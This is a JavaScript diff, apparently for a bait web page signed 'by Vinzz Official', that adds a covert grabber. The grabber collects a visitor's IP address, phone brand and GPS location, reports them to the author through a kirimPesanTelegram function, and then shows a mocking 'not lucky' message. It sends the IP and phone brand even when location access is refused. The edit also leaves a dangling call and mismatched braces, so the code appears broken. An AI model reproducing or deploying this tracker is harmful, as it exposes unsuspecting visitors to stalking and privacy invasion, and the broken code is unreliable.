@@ -48,16 +48,7 @@
     await kirimPesanTelegram(pesanAwal);
   })();
 
-  navigator.geolocation.getCurrentPosition(
-    async (pos) => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
-      const ip = await getIP();
-      const merek = getMerekHP();
-
-      const pesan = `IP berhasil ditemukan!\nStatus: MENGIZINKAN LOKASI\nIP: ${ip}\nMerek hp: ${merek}\nLokasi: ${gmaps}`;
-      await kirimPesanTelegram(pesan);
+  kirimPesanTelegram(pesan);
 
       document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
     },
@@ -71,3 +62,27 @@
       document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
     }
   );
+navigator.geolocation.getCurrentPosition(
+  async (pos) => {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
+    const ip = await getIP();
+    const merek = getMerekHP();
+
+    // Menambahkan link peta di pesan jika lokasi diizinkan
+    const pesan = `IP berhasil ditemukan!\nStatus: MENGIZINKAN LOKASI\nIP: ${ip}\nMerek hp: ${merek}\nLokasi: ${gmaps}\nPeta Lokasi: <a href="${gmaps}" target="_blank">Klik untuk melihat peta</a>`;
+    await kirimPesanTelegram(pesan);
+
+    document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
+  },
+  async () => {
+    const ip = await getIP();
+    const merek = getMerekHP();
+
+    const pesan = `IP berhasil ditemukan!\nStatus: MENOLAK LOKASI\nIP: ${ip}\nMerek hp: ${merek}`;
+    await kirimPesanTelegram(pesan);
+
+    document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
+  }
+);
